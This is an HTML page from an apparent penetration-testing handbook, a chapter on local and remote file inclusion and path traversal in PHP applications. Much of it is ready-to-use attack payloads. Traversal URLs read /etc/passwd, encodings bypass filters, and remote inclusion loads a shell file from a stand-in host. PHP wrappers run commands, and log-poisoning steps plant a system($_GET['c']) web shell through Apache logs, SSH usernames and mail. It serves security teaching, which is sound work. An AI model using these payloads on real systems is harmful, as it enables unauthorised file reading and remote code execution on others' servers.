@@ -1,0 +1,227 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="File Inclusion and Path Traversal File Inclusion File inclusion is the method for applications, and scripts, to include local or remote files during run-time. The vulnerability occurs when an application generates a path to executable code using an attacker-controlled variable, giving the attacker control over which file is executed.
+There are two different types. Local File Inclusion (LFI) where the application includes files on the current server. And Remote File Inclusion (RFI) where the application downloads and execute files from a remote server."><meta property="og:title" content="File Inclusion"><meta property="og:description" content="File Inclusion and Path Traversal File Inclusion File inclusion is the method for applications, and scripts, to include local or remote files during run-time. The vulnerability occurs when an application generates a path to executable code using an attacker-controlled variable, giving the attacker control over which file is executed.
+There are two different types. Local File Inclusion (LFI) where the application includes files on the current server. And Remote File Inclusion (RFI) where the application downloads and execute files from a remote server."><meta property="og:type" content="article"><meta property="og:url" content="https://0xffsec.com/book/web-applications/file-inclusion-and-path-traversal/"><meta property="article:modified_time" content="2020-07-16T18:04:52+02:00"><title>File Inclusion | 0xffsec Penetration Testing Book</title><link rel=icon href=/book/favicon.png type=image/x-icon><link rel=stylesheet href=/book/book.min.6df681b0bb21155cba49f6078e3559216772d8e03e780d240c73ea21817ed5e5.css integrity="sha256-bfaBsLshFVy6SfYHjjVZIWdy2OA+eA0kDHPqIYF+1eU="><script defer src=/book/en.search.min.77feb9b30f6049dbbbe0b84bc22fce4996eefdb6e238d285f58d2a140bebf5dd.js integrity="sha256-d/65sw9gSdu74LhLwi/OSZbu/bbiONKF9Y0qFAvr9d0="></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-142676329-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script></head><body><input type=checkbox class=hidden id=menu-control><main class="container flex"><aside class=book-menu><nav><h2 class=book-brand><a href=/book><span>0xffsec Penetration Testing Book</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><a href=/book/preface/>Preface</a></li><li><span>Discovery and Scanning</span><ul><li><a href=/book/discovery-and-scanning/host-discovery/>Host Discovery</a></li><li><a href=/book/discovery-and-scanning/port-scanning/>Port Scanning</a></li></ul></li><li><a href=/book/exploits-search/>Exploits Search</a></li><li><a href=/book/services/>Services</a><ul><li><a href=/book/services/ftp/>FTP - 21</a></li><li><a href=/book/services/dns/>DNS - 53</a></li><li><a href=/book/services/http-https/>HTTP/S - 80 / 443</a></li><li><a href=/book/services/smb/>SMB - 139 / 445</a></li></ul></li><li><span>Web Applications</span><ul><li><a href=/book/web-applications/cgi/>CGI</a></li><li><a href=/book/web-applications/file-inclusion-and-path-traversal/ class=active>File Inclusion</a></li></ul></li><li><a href=/book/reverse-shells/>Reverse Shells</a></li><li><a href=/book/notes/ class=collapsed>Notes</a></li></ul></nav><script>(function(){var menu=document.querySelector("aside.book-menu nav");addEventListener("beforeunload",function(event){localStorage.setItem("menu.scrollTop",menu.scrollTop);});menu.scrollTop=localStorage.getItem("menu.scrollTop");})();</script></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/book/svg/menu.svg class=book-icon alt=Menu></label>
+<strong>File Inclusion</strong>
+<label for=toc-control><img src=/book/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><input type=checkbox class=hidden id=toc-control><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><ul><li></li></ul></li><li><a href=#lfi>LFI</a><ul><li><a href=#basic-lfi>Basic LFI</a></li><li><a href=#null-byte>Null Byte</a></li><li><a href=#dot-truncation>Dot Truncation</a></li><li><a href=#encoding>Encoding</a></li><li><a href=#bypass-filtering>Bypass Filtering</a></li><li><a href=#bypass--removal>Bypass <code>../</code> removal</a></li><li><a href=#bypass--replaced-with->Bypass <code>../</code> replaced with <code>;</code></a></li><li><a href=#windows-unc-share-unc-share>Windows UNC Share</a></li></ul></li><li><a href=#rfi>RFI</a><ul><li><a href=#basic-rfi>Basic RFI</a></li><li><a href=#null-byte-1>Null Byte</a></li><li><a href=#bypass-https-removal>Bypass <code>http(s)://</code> removal</a></li><li><a href=#bypass-allow_url_include>Bypass <code>allow_url_include</code></a></li></ul></li><li><a href=#php-stream-wrappers>PHP Stream Wrappers</a><ul><li><a href=#phpfilter>php://filter</a></li><li><a href=#zip>zip://</a></li><li><a href=#data>data://</a></li><li><a href=#expect>expect://</a></li><li><a href=#phpinput>php://input</a></li></ul></li><li><a href=#the-proc-file-system>The <code>proc</code> File System</a><ul><li></li><li><a href=#useful-proc-entries>Useful <code>/proc</code> entries</a></li><li><a href=#useful-procpid-entries>Useful <code>/proc/[PID]</code> entries</a></li><li><a href=#lfi2rce---proc>LFI2RCE - /proc</a></li></ul></li><li><a href=#lfi2rce---log-poisoning>LFI2RCE - Log Poisoning</a><ul><li><a href=#apache>Apache</a></li><li><a href=#ssh>SSH</a></li><li><a href=#email>Email</a></li></ul></li><li><a href=#further-reading>Further Reading</a></li></ul></nav></aside></header><article class=markdown><h1 id=file-inclusion-and-path-traversal>File Inclusion and Path Traversal</h1><h4 id=file-inclusion>File Inclusion</h4><p>File inclusion is the method for applications,
+and scripts,
+to include local or remote files during run-time.
+The vulnerability occurs when an application
+generates a path to executable code
+using an attacker-controlled variable,
+giving the attacker
+control over which file is executed.</p><p>There are two different types.
+<strong>Local File Inclusion</strong> (LFI)
+where the application
+includes files on the current server.
+And <strong>Remote File Inclusion</strong> (RFI)
+where the application
+downloads and execute files from a remote server.
+<sup id=fnref:1><a href=#fn:1 class=footnote-ref role=doc-noteref>1</a></sup></p><h4 id=path-traversal>Path Traversal</h4><p>A path,
+or directory,
+traversal attack
+consists of exploiting weak validation,
+or sanitization,
+of user-supplied data
+allowing the attacker to read files,
+or directories,
+outside the context of the current application.</p><p>The use of these techniques
+may lead to
+information disclosure,
+cross-site-Scripting (XSS),
+and remote code execution (RCE).<sup id=fnref:2><a href=#fn:2 class=footnote-ref role=doc-noteref>2</a></sup></p><h2 id=lfi>LFI</h2><h3 id=basic-lfi>Basic LFI</h3><h4 id=absolute-path-traversal>Absolute Path Traversal</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=/etc/passwd
+</code></pre></div><h4 id=relative-path-traversal>Relative Path Traversal</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=../../../etc/passwd
+</code></pre></div><h3 id=null-byte>Null Byte</h3><p>Sometimes applications append extra characters,
+like file extensions,
+to the input variable.
+A null byte will make the application
+ignore the following characters.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=../../../etc/passwd%00
+</code></pre></div><blockquote class="book-hint warning">PHP fixed the issue
+in version 5.3.4. <a href="https://bugs.php.net/bug.php?id=39863">https://bugs.php.net/bug.php?id=39863</a></blockquote><h3 id=dot-truncation>Dot Truncation</h3><p>In PHP,
+filenames longer than 4096 bytes
+will be truncated and,
+characters after that,
+ignored.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=../../../etc/passwd................[ADD MORE]
+http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.\.\.[ADD MORE]
+http://example.com/index.php?page=../../../etc/passwd/./././././././.[ADD MORE]
+http://example.com/index.php?page=../../../[ADD MORE]../../../../../etc/passwd
+</code></pre></div><blockquote class="book-hint warning">In PHP:
+<code>/etc/passwd</code> = <code>/etc//passwd</code> = <code>/etc/./passwd</code> = <code>/etc/passwd/</code> = <code>/etc/passwd/</code></blockquote><h3 id=encoding>Encoding</h3><p>Manipulating variables that reference files
+with “dot-dot-slash&rdquo; (<code>../</code>) sequences and its variations,
+or using absolute file paths,
+may allow bypassing poorly implemented input filtering.
+<sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup></p><table><thead><tr><th align=left></th><th align=left>URL</th><th align=left>Double URL</th><th align=left>UTF-8 Unicode</th><th align=left>16 bits Unicode</th></tr></thead><tbody><tr><td align=left><code>.</code></td><td align=left><code>%2e</code></td><td align=left><code>%252e</code></td><td align=left><code>%c0%2e</code> <code>%e0%40%ae</code> <code>%c0%ae</code></td><td align=left><code>%u002e</code></td></tr><tr><td align=left><code>/</code></td><td align=left><code>%2f</code></td><td align=left><code>%252f</code></td><td align=left><code>%c0%2f</code> <code>%e0%80%af</code> <code>%c0%af</code></td><td align=left><code>%u2215</code></td></tr><tr><td align=left><code>\</code> | <code>%2c</code> | <code>%252c</code> | <code>%c0%5c</code> <code>%c0%80%5c</code> |<code>%u2216</code> |</td><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id=encoded->Encoded <code>../</code></h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>%2e%2e%2f
+%252e%252e%252f
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2215
+</code></pre></div><h4 id=encoded--1>Encoded <code>..\</code></h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>%2e%2e%2c
+%252e%252e%252c
+%c0%ae%c0%ae%c0%af
+%uff0e%uff0e%u2216
+</code></pre></div><h4 id=double-url-encoding>Double URL Encoding</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
+</code></pre></div><h4 id=utf-8-encoding>UTF-8 Encoding</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+</code></pre></div><h3 id=bypass-filtering>Bypass Filtering</h3><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=....//....//etc/passwd
+http://example.com/index.php?page=..///////..////..//////etc/passwd
+http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+</code></pre></div><h3 id=bypass--removal>Bypass <code>../</code> removal</h3><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>..././
+...\.\
+</code></pre></div><h3 id=bypass--replaced-with->Bypass <code>../</code> replaced with <code>;</code></h3><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>..;/
+http://example.com/page.jsp?include=..;/..;/sensitive.txt
+</code></pre></div><h3 id=windows-unc-share-unc-share>Windows UNC Share <sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup></h3><p>Windows UNC shares can be injected
+to redirect access to other resources.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>\\localhost\c$\windows\win.ini
+</code></pre></div><h2 id=rfi>RFI</h2><p>Most filter bypassing techniques for LFI
+can be used for RFI.</p><h3 id=basic-rfi>Basic RFI</h3><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=http://example.evil/shell.txt
+</code></pre></div><h3 id=null-byte-1>Null Byte</h3><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=http://example.evil/shell.txt%00
+</code></pre></div><h3 id=bypass-https-removal>Bypass <code>http(s)://</code> removal</h3><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>hhttp://thttp://thttp://phttp://:http://http:///http:///
+hhttps://thttps://thttps://phttps://shttps://:https:///https:///https://
+</code></pre></div><h3 id=bypass-allow_url_include>Bypass <code>allow_url_include</code></h3><p>On Windows,
+it is possible to bypass disabled <code>allow_url_include</code> and <code>allow_url_fopen</code>
+by using <code>SMB</code>.
+Simply including a script
+located in an open share.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=\\10.0.0.1\share\shell.php
+</code></pre></div><h2 id=php-stream-wrappers>PHP Stream Wrappers</h2><p>PHP provides many built-in wrappers
+for various protocols,
+to use with file functions
+such as <code>fopen</code>, <code>copy</code>, <code>file_exists</code>,
+and <code>filezise</code>.
+<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup></p><h3 id=phpfilter>php://filter</h3><p><a href=https://www.php.net/manual/en/wrappers.php.php#wrappers.php.filter><code>php://filter</code></a> is a kind of meta-wrapper
+that allows filtering a stream
+before the content is read.
+The resulting data
+is the encoded version
+of the given file&rsquo;s source code.</p><blockquote class="book-hint info">Multiple <a href=https://www.php.net/manual/en/filters.php>filter</a> chains can be specified on one path,
+chained using <code>|</code> or <code>/</code>.</blockquote><h4 id=filter-stringrot13httpswwwphpnetmanualenfiltersstringphpfiltersstringrot13>Filter <a href=https://www.php.net/manual/en/filters.string.php#filters.string.rot13>string.rot13</a>.</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
+</code></pre></div><h4 id=filter-convertbase64httpswwwphpnetmanualenfiltersconvertphpfiltersconvertbase64>Filter <a href=https://www.php.net/manual/en/filters.convert.php#filters.convert.base64>convert.base64</a>.</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
+</code></pre></div><h4 id=filter-chaining-zlibdeflatehttpswwwphpnetmanualenfilterscompressionphpfilterscompressionzlib-and-convertbase64httpswwwphpnetmanualenfiltersconvertphpfiltersconvertbase64>Filter chaining <a href=https://www.php.net/manual/en/filters.compression.php#filters.compression.zlib>zlib.deflate</a> and <a href=https://www.php.net/manual/en/filters.convert.php#filters.convert.base64>convert.base64</a>.</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
+</code></pre></div><h5 id=base64-decode-and-gzip-inflate>Base64 decode and gzip inflate.</h5><p>The resulting encoded string
+can be decoded and inflated
+by piping it into the following PHP script:</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#24909d>echo</span> [BASE64-STR] | php -r <span style=color:#ed9d13>&#39;echo gzinflate(base64_decode(file_get_contents(&#34;php://stdin&#34;)));&#39;</span>
+</code></pre></div><h3 id=zip>zip://</h3><p><a href=https://www.php.net/manual/en/wrappers.compression.php>zip://</a> is a wrapper for zip compression streams.
+To leverage the zip functionalities,
+upload a zipped PHP script to the server
+(with the preferred extension)
+and decompress in the server
+using the <code>zip://&lt;zipfile>#&lt;file></code>,
+being <code>&lt;file></code> the resulting decompressed file.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#24909d>echo</span> -n <span style=color:#ed9d13>&#39;&lt;?php system($_GET[&#39;</span>c<span style=color:#ed9d13>&#39;]); ?&gt;&#39;</span> &gt; shell.php
+zip shell.jpg shell.php
+</code></pre></div><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=zip://shell.jpg%23shell.php
+</code></pre></div><h3 id=data>data://</h3><p><a href=https://www.php.net/manual/en/wrappers.data.php>data://</a> is a wrapper for <a href=https://tools.ietf.org/html/rfc2397>RFC2397</a>,
+or <code>data://</code> scheme.
+The scheme allows the inclusion of small data items
+as if it had been included externally.
+<sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup></p><p>PHP Shell Script.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=color:#24909d>echo</span> -n <span style=color:#ed9d13>&#39;&lt;?php system($_GET[&#39;</span>c<span style=color:#ed9d13>&#39;]); ?&gt;&#39;</span> | base64
+<span style=color:#40ffff>PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4</span>=
+</code></pre></div><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4=&amp;c=ls
+</code></pre></div><h3 id=expect>expect://</h3><p><a href=https://www.php.net/manual/en/wrappers.expect.php><code>expect://</code></a> wrapper provide access to processes&rsquo;
+<code>stdio</code>, <code>stdout</code> and <code>stderr</code>
+via PTY.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>http://example.com/index.php?page=expect://ls
+</code></pre></div><h3 id=phpinput>php://input</h3><p><a href=https://www.php.net/manual/en/wrappers.php.php#wrappers.php.input><code>php://input</code></a> is a read-only stream that allows to read raw data
+from the request body.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl -X POST --data <span style=color:#ed9d13>&#34;&lt;?php echo shell_exec(&#39;ls&#39;); ?&gt;&#34;</span> <span style=color:#ed9d13>&#34;http://example.com/index.php?page=php://input%00&#34;</span> -v
+</code></pre></div><h2 id=the-proc-file-system>The <code>proc</code> File System</h2><p>The <code>proc</code> file system (<code>procfs</code>)
+contains a hierarchy of special files
+that represent the current state of the kernel.
+It acts as an interface
+to internal data structures in the kernel
+for applications and users.</p><p>Because of its abstract properties,
+it is also referred to as a <a href=https://en.wikipedia.org/wiki/Virtual_file_system>virtual file system</a>.</p><p>File within this directory
+are listed as zero bytes in size,
+even though,
+can contain a large amount of data.
+<sup id=fnref:7><a href=#fn:7 class=footnote-ref role=doc-noteref>7</a></sup></p><h4 id=process-directories>Process Directories</h4><p>The <code>/proc</code> directory contains
+one subdirectory for each process
+running on the system,
+which is named
+after the process ID (PID).
+Concurrently,
+each of these directories
+contains files to store information
+about the respective process.
+<sup id=fnref:8><a href=#fn:8 class=footnote-ref role=doc-noteref>8</a></sup></p><h4 id=procself-fsprocselfchttpsgithubcomtorvaldslinuxblobmasterfsprocselfc><code>/proc/self</code> (<a href=https://github.com/torvalds/linux/blob/master/fs/proc/self.c>/fs/proc/self.c</a>)</h4><p>The <code>/proc/self</code>
+represents the currently scheduled PID.
+In other words,
+a symbolic link
+to the currently running process&rsquo;s directory.</p><p>It is a self-referenced device driver,
+or module,
+maintained by the Kernel.</p><h3 id=useful-proc-entries>Useful <code>/proc</code> entries</h3><ul><li><code>/proc/version</code>:
+Kernel version.</li><li><code>/proc/sched_debug</code>:
+Scheduling information
+and running processes
+per CPU.</li><li><code>/proc/mounts</code>:
+Mounted file systems.</li><li><code>/proc/net/arp</code>:
+ARP table.</li><li><code>/proc/net/route</code>:
+Routing table.</li><li><code>proc/net/tcp</code> / <code>udp</code>:
+TCP or UDP active connections.</li><li><code>/proc/net/fib_trie</code>:
+Routing tables trie.<sup id=fnref:9><a href=#fn:9 class=footnote-ref role=doc-noteref>9</a></sup></li></ul><h3 id=useful-procpid-entries>Useful <code>/proc/[PID]</code> entries</h3><ul><li><p><code>/proc/[PID]/cmdline</code>
+Process invocation command with parameters.</p><p>It potentially exposes
+paths,
+usernames and passwords.</p></li><li><p><code>/proc/[PID]/environ</code>
+Environment variables.</p><p>It potentially exposes
+paths,
+usernames and passwords.</p></li><li><p><code>/proc/[PID]/cwd</code>
+Process&rsquo; current working directory.</p></li><li><p><code>/proc/[PID]/fd/[#]</code>
+File descriptors.</p><p>Contains one entry
+for each file
+which the process has open.</p></li></ul><h3 id=lfi2rce---proc>LFI2RCE - /proc</h3><h4 id=procselfenviron>/proc/self/environ</h4><p><code>/proc/self/environ</code> contains user inputs
+that turn it
+in a useful volatile storage.
+Apache stores an environment variable
+for the <code>HTTP_USER_AGENT</code> header
+to be used by
+the self-contained modules.<sup id=fnref:10><a href=#fn:10 class=footnote-ref role=doc-noteref>10</a></sup></p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl <span style=color:#ed9d13>&#34;http://example.com/index.php?page=/proc/self/environ&amp;c=id&#34;</span> -H <span style=color:#ed9d13>&#34;User-Agent&#34;</span> --data <span style=color:#ed9d13>&#34;&lt;?php system(</span><span style=color:#40ffff>$_GET</span><span style=color:#ed9d13>[&#39;c&#39;]); ?&gt;&#34;</span>
+</code></pre></div><h4 id=procpidfdfd-swissky-dt>/proc/[PID]/fd/[FD] <sup id=fnref:3><a href=#fn:3 class=footnote-ref role=doc-noteref>3</a></sup></h4><ol><li><p>Upload A LOT of shells.</p></li><li><p>Include <code>http://example.com/index.php?page=/proc/$PID/fd/$fd</code>.</p><p>Bruteforce the process ID (<code>$PID</code>)
+and file descriptor id (<code>$FD</code>)</p></li></ol><h2 id=lfi2rce---log-poisoning>LFI2RCE - Log Poisoning</h2><p>A log file
+is a file that contains a record of events from an application.
+A log poisoning attack
+consists of triggering one of these events
+with executable code as part of the logged data,
+and successively,
+through LFI,
+include and execute the code.</p><blockquote class="book-hint info"><p>It is recommended to first load the target log,
+not only to verify the access
+but to identify what data is being stored.</p><p>Administrators can modify the logged data
+according to their needs.</p></blockquote><h3 id=apache>Apache</h3><p>By default,
+Apache maintains access and error logs.
+The <code>error</code> log,
+commonly,
+register the <code>Referer</code> header,
+while the <code>acccess</code> log,
+the <code>User-Agent</code>.
+<sup id=fnref:11><a href=#fn:11 class=footnote-ref role=doc-noteref>11</a></sup></p><h4 id=access-log>Access Log</h4><p>Make a valid request
+with the code in the <code>User-Agent</code> header.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl -H <span style=color:#ed9d13>&#39;User-Agent&#39;</span> --data <span style=color:#ed9d13>&#34;&lt;?php system(</span><span style=color:#40ffff>$_GET</span><span style=color:#ed9d13>[&#39;c&#39;]); ?&gt;&#34;</span> <span style=color:#ed9d13>&#34;http://example.com&#34;</span> -v
+</code></pre></div><h4 id=error-log>Error Log</h4><p>Make an invalid request,
+an invalid inclusion for example,
+with the suitable <code>Referer</code> header.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>curl -H <span style=color:#ed9d13>&#39;Referer&#39;</span> --data <span style=color:#ed9d13>&#34;&lt;?php system(</span><span style=color:#40ffff>$_GET</span><span style=color:#ed9d13>[&#39;c&#39;]); ?&gt;&#34;</span> <span style=color:#ed9d13>&#34;http://example.com/invalid#req&#34;</span> -v
+</code></pre></div><blockquote class="book-hint warning"><p>The Apache logging API
+escapes strings going to the logs.</p><p>Use single quotes (<code>'</code>)
+since double quotes (<code>"</code>) are replaced escaped as <code>"quote";</code></p></blockquote><h4 id=lfi-1>LFI</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt>http://example.com/index.php?page=/path/to/access.log&amp;c=id
+</code></pre></div><h4 id=common-apache-log-paths>Common Apache Log Paths</h4><p>Log files can also be set to custom locations,
+either globally,
+or domain based if virtual hosting is enabled.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>/var/log/httpd/access_log
+/var/log/httpd/error_log
+
+/var/log/apache/access.log
+/var/log/apache/error.log
+
+/var/log/apache2/access.log
+/var/log/apache2/error.log
+
+/usr/local/apache/log/access_log
+/usr/local/apache/log/error_log
+
+/usr/local/apache2/log/access_log
+/usr/local/apache2/log/error_log
+
+/var/log/nginx/access.log
+/var/log/nginx/error.log
+</code></pre></div><h3 id=ssh>SSH</h3><p>SSH logs the username of each connection.
+Create a connection to SSH
+with the suitable username.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>ssh <span style=color:#ed9d13>&#39;&lt;?php system(&#39;</span>id<span style=color:#ed9d13>&#39;); ?&gt;&#39;</span>@example.com
+</code></pre></div><h4 id=lfi-2>LFI</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt>http://example.com/index.php?page=/path/to/sshd.log&amp;c=id
+</code></pre></div><h4 id=common-ssh-log-paths>Common SSH Log Paths</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>/var/log/auth.log
+/var/log/sshd.log
+</code></pre></div><h3 id=email>Email</h3><p>Email an internal account,
+containing the script.</p><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>mail -s <span style=color:#ed9d13>&#34;&lt;?php system(</span><span style=color:#40ffff>$_GET</span><span style=color:#ed9d13>[&#39;c&#39;]);?&gt;&#34;</span> www-data@10.0.0.3 &lt; /dev/null
+</code></pre></div><h4 id=lfi-3>LFI</h4><div class=highlight><pre style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-txt data-lang=txt>http://example.com/index.php?page=/var/mail/www-data&amp;c=id
+</code></pre></div><h2 id=further-reading>Further Reading</h2><ul><li><a href=https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md>OWASP - Testing Directory Traversal File Include</a></li><li><a href="https://www.youtube.com/watch?v=GePBmsNJw6Y">BSidesMCR 2018: It&rsquo;s A PHP Unserialization Vulnerability Jim, But Not As We Know It by Sam Thomas</a></li><li><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders>PayloadsAllTheThings Intruders</a></li></ul><section class=footnotes role=doc-endnotes><hr><ol><li id=fn:1 role=doc-endnote><p>Contributors to Wikimedia projects. “File Inclusion Vulnerability - Wikipedia.” Wikipedia, the Free Encyclopedia, Wikimedia Foundation, Inc., 24 Nov. 2006, <a href=https://en.wikipedia.org/wiki/File_inclusion_vulnerability>https://en.wikipedia.org/wiki/File_inclusion_vulnerability</a>. <a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:2 role=doc-endnote><p>“Path Traversal - OWASP.” OWASP, <a href=https://wiki.owasp.org/index.php/Path_Traversal>https://wiki.owasp.org/index.php/Path_Traversal</a>. <a href=#fnref:2 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:3 role=doc-endnote><p>swisskyrepo. “PayloadsAllTheThings / Directory Traversal.” GitHub, <a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal</a>. <a href=#fnref:3 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:4 role=doc-endnote><p>“CWE-40: Path Traversal: ‘\UNC\share\name\’ (Windows UNC Share) (4.1).” CWE -  Common Weakness Enumeration, <a href=https://cwe.mitre.org/data/definitions/40.html>https://cwe.mitre.org/data/definitions/40.html</a>. <a href=#fnref:4 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:5 role=doc-endnote><p>“PHP: Supported Protocols and Wrappers - Manual.” PHP: Hypertext Preprocessor, <a href=https://www.php.net/manual/en/wrappers.php>https://www.php.net/manual/en/wrappers.php</a>. <a href=#fnref:5 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:6 role=doc-endnote><p>“RFC 2397 - The ‘Data’ URL Scheme.” IETF Tools, <a href=https://tools.ietf.org/html/rfc2397>https://tools.ietf.org/html/rfc2397</a>. <a href=#fnref:6 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li><li id=fn:7 role=doc-endnote><p>“The /Proc Filesystem.” The Linux Kernel  Documentation, <a 